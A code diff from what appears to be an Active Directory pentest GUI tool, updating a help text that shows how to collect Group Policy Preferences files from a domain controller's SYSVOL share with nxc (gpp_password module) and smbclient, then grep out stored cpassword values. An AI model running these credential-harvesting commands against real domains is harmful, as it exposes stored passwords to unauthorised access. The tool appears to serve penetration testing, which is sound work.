@@ -3717,9 +3717,11 @@ class CardADRoutesMixin:
                   "[Machine|User]\\Preferences\\"
                   "{Groups,Services,ScheduledTasks,Printers,DataSources,"
                   "Drives}\\*.xml\n\n"
-                  "Quick grab with smbclient / nxc:\n"
-                  "  smbclient //DC/SYSVOL -N -c 'recurse; prompt; mget *'\n"
-                  "  nxc smb DC --pass-pol --shares  (then enumerate SYSVOL)",
+                  "Grab it (a DC refuses null sessions — use a domain user):\n"
+                  "  nxc smb <DC> -u <user> -p <pass> -M gpp_password\n"
+                  "  smbclient //<DC>/SYSVOL -U '<user>%<pass>' -c "
+                  "'recurse ON; prompt OFF; mget *'\n"
+                  "    then:  grep -rho 'cpassword=\"[^\"]*\"' .",
                   COLORS["border_dim"])
 
         ctk.CTkLabel(win, text="cpassword (base64):",
